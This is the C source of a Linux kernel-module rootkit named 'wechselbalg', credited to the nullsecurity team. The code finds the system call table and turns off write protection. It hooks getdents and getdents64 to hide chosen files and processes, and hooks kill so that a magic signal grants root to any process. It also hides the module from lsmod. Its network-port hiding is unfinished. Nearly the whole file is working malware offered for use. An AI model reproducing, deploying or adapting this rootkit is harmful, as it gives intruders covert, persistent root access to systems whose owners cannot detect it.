/*******************************************************************************
 *                ____                     _ __                                *
 *     ___  __ __/ / /__ ___ ______ ______(_) /___ __                          *
 *    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                          *
 *   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                           *
 *                                            /___/ team                       *
 *                                                                             *
 * wechselbalg.c                                                               *
 *                                                                             *
 * DATE                                                                        *
 * 10/26/2016                                                                  *
 *                                                                             *
 * AUTHOR                                                                      *
 * atzeton - http://www.nullsecurity.net/                                      *
 *                                                                             *
 * LICENSE                                                                     *
 * GPLv2                                                                       *
 *                                                                             *
 ******************************************************************************/

#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/kobject.h>
#include <linux/slab.h>
#include <linux/kallsyms.h>
#include <linux/proc_fs.h>
#include <linux/syscalls.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/init.h>
#include <net/tcp.h>
#include <linux/ftrace.h>

#include "wechselbalg.h"

/**
 * Parse the list of given process ids or names to hidden_procs
 */
void parse_hidden_procs(void)
{
	const char delimiters[] = " ,";
    char *running = hidden_procs;
    char *token;
    struct hidden_process *new_hidden_process;
	
	token = strsep (&running, delimiters);

	while(token != NULL) {
		if (verbose > 0) {
			printk(KERN_INFO MODULE_NAME "Process to be hidden: %s\n", token);
		}
		
		new_hidden_process = (struct hidden_process *)kmalloc(sizeof(struct hidden_process), GFP_KERNEL);

		strncpy(new_hidden_process->name, token, PROCESS_NAME_LEN - 1);
		
		INIT_LIST_HEAD(&new_hidden_process->list);
		
		list_add(&new_hidden_process->list, &hidden_procs_list);
		
		token = strsep(&running, delimiters);
	}
	
}

/**
 * Parse the list of given file names to hidden_files
 */
void parse_hidden_files(void)
{
	const char delimiters[] = " ,";
    char *running = hidden_files;
    char *token;
    struct hidden_file *new_hidden_file;
	
	
	token = strsep (&running, delimiters);
	

	while(token != NULL) {
		if (verbose > 0) {
			printk(KERN_INFO MODULE_NAME "File to be hidden: %s\n", token);
		}
		
		new_hidden_file = (struct hidden_file *)kmalloc(sizeof(struct hidden_file), GFP_KERNEL);

		strncpy(new_hidden_file->name, token, FILE_NAME_LEN - 1);
		
		INIT_LIST_HEAD(&new_hidden_file->list);
		
		list_add(&new_hidden_file->list, &hidden_file_list);
		
		
		token = strsep(&running, delimiters);
	}
	
}



/**
 * try using the msr register, as described in appendix [1]
 */
static void **sys_call_table_get_by_msr(void) 
{
	/* pattern for system_call_table */
    uint8_t sct_pattern[] = {0xff, 0x14, 0xc5};
	
    ulong *system_call = NULL;
    uint8_t *ptr       = NULL;
    uint i             = 0;
    ulong low          = 0;
    ulong high         = 0;
    
    
	/* get sys_call addr out of msr register */
    asm("rdmsr" 
		: "=a" (low), "=d" (high) 
		: "c" (IA32_LSTAR)
	);

    system_call = (ulong *)((high << 32) | low);
    
    ptr = (uint8_t *)system_call;

	// scan for pattern
    for(i = 0; i < 350; i++) {
		if (memcmp(ptr, &sct_pattern, sizeof(sct_pattern)) == 0) {
            return (void **)(0xffffffff00000000 | *((ulong *)(ptr+3)) );
		}
        ptr++;
        i++;
        
    }

    return(NULL);
}

/**
 * try using &yield, which is exported by the kernel and 
 * located in front of sys_call table (applies to amd64)
 */
static void **sys_call_table_get_by_yield(void)
{
	ulong offset  = (ulong)&yield;
	ulong **sct   = NULL;

	if (verbose > 0) {
		printk(KERN_INFO MODULE_NAME "yield found at: %p\n", &yield);
	}

	while (offset < ULLONG_MAX) {
		sct = (ulong **)offset;

		// TODO more 
		if( sct[__NR_close] == (ulong *)sys_close) { 
			return (void **)sct;
		}

		offset += sizeof(void *);
	}
	
	return(NULL);
}

/**
 * Get the system call table.
 */
static int sys_call_table_get(void)
{
	if (verbose > 0) {
		printk(KERN_INFO MODULE_NAME "sys_call_table by msr: %p\n", sys_call_table_get_by_msr());
		printk(KERN_INFO MODULE_NAME "sys_call_table by exported <yield> symbol: %p\n", sys_call_table_get_by_yield());
	}
	
	sys_call_table = sys_call_table_get_by_msr();
	
	if (verbose > 0) {
		printk(KERN_INFO MODULE_NAME "sys_call_table: %p\n",sys_call_table_get_by_msr());
	}
	
	
	if(sys_call_table == NULL) {
		if (verbose > 0) {
			printk(KERN_ERR MODULE_NAME "catching sys_call_table failed");
		}
	
		return(-1);
	}
	
	return(0);
}

/**
 * Hooks needed system table entries. Doesn't hook the sct itself.
 */
static void sys_call_table_hook(void)
{
	// hook both getdents, which are used for displaying files in folder structure
	fs_getdents64_actual = sys_call_table[__NR_getdents64];
	fs_getdents_actual = sys_call_table[__NR_getdents];
	
	DISABLE_WP;
	sys_call_table[__NR_getdents64] = fs_getdents64_new;
	sys_call_table[__NR_getdents] = fs_getdents_new;
    ENABLE_WP;
	
	if (verbose > 0) {
		printk(KERN_INFO MODULE_NAME "getdents(), getdents64() hooked\n");
	}
}

/**
 * Unhooks needed system table entries. Doesn't unhook the sct itself.
 */
static void sys_call_table_unhook(void)
{
    DISABLE_WP;
	sys_call_table[__NR_getdents64] = fs_getdents64_actual;
	sys_call_table[__NR_getdents] = fs_getdents_actual;
    ENABLE_WP;	
    
    if (verbose > 0) {
		printk(KERN_INFO MODULE_NAME "getdents(), getdents64() unhooked\n");
	}
}

/**
 * TODO currently not working (since 4.x)
 */
static void net_tcp4_init(void)
{
	struct net *initnet = &init_net; // http://lxr.free-electrons.com/source/include/net/net_namespace.h
	
	if (verbose > 0) {
		printk(KERN_INFO MODULE_NAME "init_net=%p\n",initnet);
	}
	
	
	struct proc_dir_entry *net_subdir = init_net.proc_net; // http://lxr.free-electrons.com/source/fs/proc/internal.h#L31
	
	if (verbose > 0) {
		printk(KERN_INFO MODULE_NAME "net_subdir = %s %p\n", net_subdir->name, net_subdir);
	}
	
	while (net_subdir != NULL) {
        net_subdir = net_subdir->next;
        
        if (verbose > 0) {
			printk(KERN_INFO MODULE_NAME "| net_subdir=%p\n",net_subdir);
		}
	}
	
	
	
	
	/*
	struct tcp_seq_afinfo *tcp4_afinfo = NULL;
    
    
    
    
    
    struct proc_dir_entry *net_subdir = init_net.proc_net->subdir;

	if (verbose > 0) {
		printk(KERN_INFO MODULE_NAME "net_subdir=%p\n",net_subdir);
	}*/


	/*while (strcmp(net_subdir->name, "tcp")) {
        net_subdir = net_subdir->next;
        
        if (verbose > 0) {
			printk(KERN_INFO MODULE_NAME ": net_subdir=%p\n",net_subdir);
		}
	}

    tcp4_afinfo = (struct tcp_seq_afinfo *)net_subdir->data;
    
    if (verbose > 0) {
		printk(KERN_INFO MODULE_NAME " tcp4_afinfo =%p\n", tcp4_afinfo );
	}
    */
    // save the old seq_ops.show()
    //net_tcp4_seqops_show_actual = tcp4_afinfo->seq_ops.show;
    
    // replace it with the new
    //tcp4_afinfo->seq_ops.show = net_tcp4_seqops_show_new;
    
    return;
}

/**
 * TODO currently not working (since 4.x)
 */
static void net_tcp4_clean(void)
{
	struct tcp_seq_afinfo *tcp4_afinfo = NULL;
    struct proc_dir_entry *net_subdir = init_net.proc_net->subdir;
 
    while (strcmp(net_subdir->name, "tcp")) {
		net_subdir = net_subdir->next;
	}
        
    tcp4_afinfo = (struct tcp_seq_afinfo *)net_subdir->data;
    
    // restore original seq_ops.show()
    tcp4_afinfo->seq_ops.show = net_tcp4_seqops_show_actual;
	
	return;
}

/**
 * TODO currently not working (since 4.x)
 */
static void net_init(void)
{
	net_tcp4_init();
	
	return;
}


/**
 * TODO currently not working (since 4.x)
 */
static void net_clean(void)
{
	//net_tcp4_clean();
	
	return;
}

/**
 * TODO currently not working (since 4.x)
 */
static int net_tcp4_seqops_show_new(struct seq_file *seq, void *v)
{
    int retval=net_tcp4_seqops_show_actual(seq, v);

    /*char port[12];

    sprintf(port,"%04X",22);

	if(strnstr(seq->buf+seq->count-TMPSZ,port,TMPSZ)) {
		
	}
	
	if (port_is_to_be_hidden(seq->buf+seq->count-TMPSZ)) {
		seq->count -= TMPSZ;
	}*/
               
	return retval;   
}



/**
 * sys_kill hook function.
 */
static asmlinkage int signal_kill_additional(pid_t pid, int sig) 
{
	struct task_struct *task = NULL;
	
	/* If the cought signal equals the required magic one
	 * give root to the signal destination process */
	if (sig == MAGIC_SIGNAL_NUM) {
		for_each_process(task) {
			if (task->pid == pid) {
				struct cred *c;
				c = prepare_creds();
				
				if (c == NULL) {
					if (verbose > 0) {
						printk(KERN_INFO MODULE_NAME " prepare_creds() failed");
					}
					
					break;
				}
				
				// TODO there might be problems with concurrency
				c->uid.val = c->gid.val = 0;
				c->euid.val = c->egid.val = 0;
				c->suid.val = c->sgid.val = 0;
				c->fsuid.val = c->fsgid.val = 0;
				
				commit_creds(c);

				if (verbose > 0) {
					printk(KERN_INFO MODULE_NAME "magic signal intercepted! %s (pid %d)\n",task->comm, task->pid);
				}
				
				break;
			}
		}
	}
	
	if (pid_is_to_be_hidden(pid)) {
		return -1;
	}
    
    return (*signal_kill_actual)(pid, sig);
}

/**
 * Get pid by process name.
 */
int get_pid_by_name(char *name) 
{
	struct task_struct *task = NULL;
	
	for_each_process(task) {
		if (strcmp(task->comm, name) == 0) {
			return task->pid;
		}
	}
	
	return(-1);
}


/**
 * Hide the module from lsmod.
 */
static void hide_module(void) 
{
	list_del_init(&__this_module.list);
	kobject_del(&__this_module.mkobj.kobj);
	list_del(&__this_module.mkobj.kobj.entry);
	
	try_module_get(&__this_module);
	
	return;
}

/**
 * Returns if port is to be hidden (1) or not (0)
 */
int port_is_to_be_hidden(char *seq_port)
{
	uint i = 0;
	char port[12];
	
	for (i = 0; i < hidden_ports_count; i++) {
		memset(port, 0x00, 12);
		sprintf(port,"%04X",hidden_ports[i]);

		if(strstr(seq_port,port)) {
			if (verbose > 0) {
				printk(KERN_INFO "port %s will be hidden\n",port);
			}
				
			return 1;
		}
	}
	
	return 0;
}

/**
 * Returns if process with pid is to be hidden.
 */
int pid_is_to_be_hidden(pid_t pid) 
{
	struct hidden_process *tmp;
	struct list_head *pos;
	
	list_for_each(pos, &hidden_procs_list){
		tmp = list_entry(pos, struct hidden_process, list);
			
		if (get_pid_by_name(tmp->name) == pid) {
			if (verbose > 0) {
				printk("hiding process %d\n", pid);
			}
			return 1;
		}
	}
	
	return 0;
}

/**
 * Returns if process with name is to be hidden.
 */
int process_is_to_be_hidden(char *name) 
{
	struct hidden_process *tmp;
	struct list_head *pos;
	
	uint potential_pid = 0;
	
	if (sscanf(name,"%u", &potential_pid) == 1) {
		
		list_for_each(pos, &hidden_procs_list){
			 tmp = list_entry(pos, struct hidden_process, list);
			 if (potential_pid == get_pid_by_name(tmp->name)) {
				 printk("hiding process %d\n", potential_pid);
				 return 1;
			 }
		}
	}
	
	return 0;
}

/**
 * Returns if file with name is to be hidden.
 */
int file_is_to_be_hidden(char *name) 
{
	struct hidden_file *tmp;
	struct list_head *pos;
	
	list_for_each(pos, &hidden_file_list) {
		tmp = list_entry(pos, struct hidden_file, list);
		
		if (strcmp(name, tmp->name) == 0) {
			return(1);
		}
	}
	
	return(0);
}

/**
 * getdents64 system call hook function.
 */
static int fs_getdents64_new(unsigned int fd, struct linux_dirent64 __user *dirp_userspace, unsigned int count) 
{
	size_t nread;
	uint8_t visible = 0;
	size_t bpos;
	struct linux_dirent64 *dirp_kernelspace = NULL;
	struct linux_dirent64 *dirp_current = NULL;

	nread = (*fs_getdents64_actual) (fd, dirp_userspace, count);

	dirp_kernelspace = (struct linux_dirent64*) kmalloc(nread, GFP_KERNEL);
	
	if (copy_from_user(dirp_kernelspace, dirp_userspace, nread) > 0) {
		return(-1);
	}

	dirp_current = dirp_kernelspace;
	
	bpos = nread;

	while (bpos > 0){
		visible = 1;
		bpos -= dirp_current->d_reclen;
	
		if (process_is_to_be_hidden(dirp_current->d_name) || file_is_to_be_hidden(dirp_current->d_name)){
			printk(KERN_INFO MODULE_NAME "getdents64: %s will be hidden\n", dirp_current->d_name);
			
			nread -= dirp_current->d_reclen;
			visible = 0;

			memmove(dirp_current, (char*) dirp_current + dirp_current->d_reclen, bpos);
		}

		// get next dirent
		if(bpos > 0 && visible > 0) {
			dirp_current = (struct linux_dirent64 *)((char *) dirp_current + dirp_current->d_reclen);
		}
	}

	if (copy_to_user(dirp_userspace, dirp_kernelspace, nread) > 0){
		return(-1);
	}
	
	kfree(dirp_kernelspace);

	return nread;
}

/**
 * getdents system call hook function.
 */
static int fs_getdents_new(unsigned int fd, struct linux_dirent __user *dirp_userspace, unsigned int count) 
{
	size_t nread;
	uint8_t visible = 0;
	size_t bpos;
	struct linux_dirent *dirp_kernelspace = NULL;
	struct linux_dirent *dirp_current = NULL;

	nread = (*fs_getdents_actual) (fd, dirp_userspace, count);

	dirp_kernelspace = (struct linux_dirent *) kmalloc(nread, GFP_KERNEL);
	if (copy_from_user(dirp_kernelspace, dirp_userspace, nread) > 0){
		return(-1);
	}

	dirp_current = dirp_kernelspace;
	
	bpos = nread;

	while (bpos > 0){
		visible = 1;
		bpos -= dirp_current->d_reclen;
		
		if (process_is_to_be_hidden(dirp_current->d_name) || file_is_to_be_hidden(dirp_current->d_name)) {
			printk(KERN_INFO MODULE_NAME "getdents: %s will be hidden\n", dirp_current->d_name);
			nread -= dirp_current->d_reclen;
			visible = 0;
		
			memmove(dirp_current, (char*) dirp_current + dirp_current->d_reclen, bpos);
		}

		// get next dirent
		if(bpos > 0 && visible > 0) {
			dirp_current = (struct linux_dirent *)((char *) dirp_current + dirp_current->d_reclen);
		}
	}

	if (copy_to_user(dirp_userspace, dirp_kernelspace, nread) > 0){
		return(-1);
	}
	
	
	kfree(dirp_kernelspace);

	return nread;
}



/**
 * Magic signal privilege expansion initialisation/system call hooking
 */
static void signal_init(void) 
{
	signal_kill_actual = sys_call_table[__NR_kill];

	DISABLE_WP;
    sys_call_table[__NR_kill] = signal_kill_additional;
    ENABLE_WP;
    
    if (verbose > 0) {
		printk(KERN_INFO MODULE_NAME "sys_call_table[__NR_kill] hooked: %p (original) -> %p (hook) \n", signal_kill_actual, signal_kill_additional);
	}
}


/**
 * Magic signal privilege expansion shutdown/system call unhooking
 */
static void signal_clean(void) 
{
	DISABLE_WP;
    sys_call_table[__NR_kill] = signal_kill_actual;
    ENABLE_WP;
    
    if (verbose > 0) {
		printk(KERN_INFO MODULE_NAME "sys_call_table[__NR_kill] = %p (restored)\n", sys_call_table[__NR_kill]);
    }
    
    return;
}


/**
 * Module starting point.
 */
int __init init_module(void) 
{	
	if (verbose > 0) {
		printk(KERN_INFO MODULE_NAME "changeling has been planted (betritt die Bühne)\n");
		printk(KERN_INFO MODULE_NAME "module hiding: %d, verbosity: %d\n", hide, verbose);
	}
	
	// hide the module
	if (hide > 0) {
		hide_module();
	}
	

	// get system call table
	if (sys_call_table_get() < 0) {
		return(-1);
	}

	sys_call_table_hook();
	
	//net_init();
	
	
	parse_hidden_procs();
	parse_hidden_files();
	
	signal_init();
	
	return(0);
}

/**
 * Module final cleanup function
 */
void __exit cleanup_module(void) 
{	
	// clean up sys_signal's hook
	signal_clean();
    
    // unhook the system call table
    sys_call_table_unhook();
    
    
    //net_clean();
    
    if (verbose > 0) {
		printk(KERN_INFO MODULE_NAME "unloading (geht ab)\n"); 
	}
}

